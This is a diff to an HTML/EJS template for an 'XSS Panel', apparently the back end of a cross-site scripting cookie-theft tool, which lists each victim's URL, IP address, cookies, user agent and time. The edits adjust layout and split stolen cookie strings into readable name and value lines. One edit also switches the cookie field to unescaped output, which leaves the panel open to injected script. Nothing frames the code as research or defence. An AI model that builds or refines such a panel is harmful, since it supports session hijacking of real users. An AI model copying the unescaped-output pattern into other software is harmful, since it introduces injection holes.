@@ -9,6 +9,7 @@
     pre {
       white-space: pre-wrap !important;
       word-break: break-word !important;
+      margin: 0 !important;
     }
   </style>
 </head>
@@ -21,7 +22,7 @@
   <div class="pt-20 px-4 max-w-7xl mx-auto">
     <h1 class="text-3xl font-bold mb-8 text-center text-yellow-300">XSS Panel</h1>
 
-    <div class="overflow-x-auto bg-zinc-800 rounded-lg shadow-lg p-6">
+    <div class="overflow-x-auto bg-zinc-800 rounded-lg shadow-lg p-6 min-w-[1200px]">
       <table class="min-w-full divide-y divide-yellow-700 text-yellow-200">
         <thead class="bg-zinc-900 text-yellow-400">
           <tr>
@@ -40,18 +41,20 @@
               <td class="px-4 py-2 text-sm"><%= p.id %></td>
               <td class="px-4 py-2 text-sm break-all max-w-xs"><%= p.url %></td>
               <td class="px-4 py-2 text-sm"><%= p.ip %></td>
-              <td class="px-4 py-2 text-sm max-w-[200px] max-h-32 overflow-auto whitespace-pre-wrap break-words">
-              <% if (p.cookies) { 
+              <td class="px-4 py-2 text-sm max-w-[300px] max-h-32 overflow-auto break-words">
+                <% if (p.cookies) {
                   const formattedCookies = p.cookies
                     .split(';')
-                    .map(cookie => cookie.trim().replace('=', ': '))
-                    .join('\n');
-              %>
-                <pre><%= formattedCookies %></pre>
-              <% } else { %>
-                <span class="italic text-yellow-500">No cookies</span>
-              <% } %>
-            </td>
+                    .map(cookie => cookie.trim())
+                    .filter(cookie => cookie.length > 0)
+                    .map(cookie => cookie.replace('=', ': '))
+                    .join('\n'); %>
+                    <pre class="m-0 leading-tight whitespace-pre-wrap"><%- formattedCookies.replace(/^\s*\n|\n\s*$/g, '') %></pre>
+                <% } else { %>
+                  <span class="italic text-yellow-500">No cookies</span>
+                <% } %>
+              </td>
+              
               <td class="px-4 py-2 text-sm break-all max-w-xs"><%= p.userAgent %></td>
               <td class="px-4 py-2 text-sm"><%= p.time %></td>
               <td class="px-4 py-2 text-sm">
